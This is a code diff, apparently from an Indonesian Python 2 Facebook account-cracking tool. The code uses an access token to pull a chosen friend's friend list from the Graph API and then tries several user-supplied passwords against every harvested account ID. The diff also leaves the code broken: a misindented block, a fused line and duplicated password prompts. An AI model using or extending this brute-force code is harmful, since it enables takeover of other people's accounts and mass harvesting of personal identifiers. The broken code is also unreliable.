@@ -1013,21 +1013,6 @@ def pilih_mbf():
 		z = json.loads(r.text)
 		for i in z['data']:
 			id.append(i['id'])
-		print 42*"\033[1;96m="
-		idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
-		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama teman\033[1;91m :\033[1;97m "+op["name"]
-		except KeyError:
-			print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
-			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
-			mbf()
-		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for i in z['data']:
-			id.append(i['id'])
 	elif peak =="0":
 		menu()
 	else:
@@ -1044,8 +1029,33 @@ def pilih_mbf():
 	pass1 = raw_input("\033[1;36m[1] \033[1;93mPassword \033[1;91m: \033[1;97m")
 	pass2 = raw_input("\033[1;36m[2] \033[1;93mPassword \033[1;91m: \033[1;97m")
 	pass3 = raw_input("\033[1;36m[3] \033[1;93mPassword \033[1;91m: \033[1;97m")
-	pass4 = raw_input("\033[1;36m[3] \033[1;93mPassword \033[1;91m: \033[1;97m")
-	pass5 = raw_input("\033[1;36m[3] \033[1;93mPassword \033[1;91m: \033[1;97m")
+	pass4 = raw_input("\033[1;36m[4] \033[1;93mPassword \033[1;91m: \033[1;97m")
+	pass5 = raw_input("\033[1;36m[5] \033[1;93mPassword \033[1;91m: \033[1;97m")
+		print 42*"\033[1;96m="
+		ids = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
+		try:
+			jok = requests.get("https://graph.facebook.com/"+ids+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama teman\033[1;91m :\033[1;97m "+op["name"]
+		except KeyError:
+			print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
+			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
+			mbf()
+		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
+		r = requests.get("https://graph.facebook.com/"+ids+"/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])print "\033[1;96m[+] \033[1;93mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
+	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+	print
+	pass1 = raw_input("\033[1;36m[1] \033[1;93mPassword \033[1;91m: \033[1;97m")
+	pass2 = raw_input("\033[1;36m[2] \033[1;93mPassword \033[1;91m: \033[1;97m")
+	pass3 = raw_input("\033[1;36m[3] \033[1;93mPassword \033[1;91m: \033[1;97m")
+	pass4 = raw_input("\033[1;36m[4] \033[1;93mPassword \033[1;91m: \033[1;97m")
+	pass5 = raw_input("\033[1;36m[5] \033[1;93mPassword \033[1;91m: \033[1;97m")
 	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
 	print 42*"\033[1;96m="
 	print "\033[96m| 😎 | " + 3*" " + "\033[35mIdentitas" + 4*" " + "\033[96m" + 5*" " + "\033[33mPassword" + 8*" " + "\033[96m"
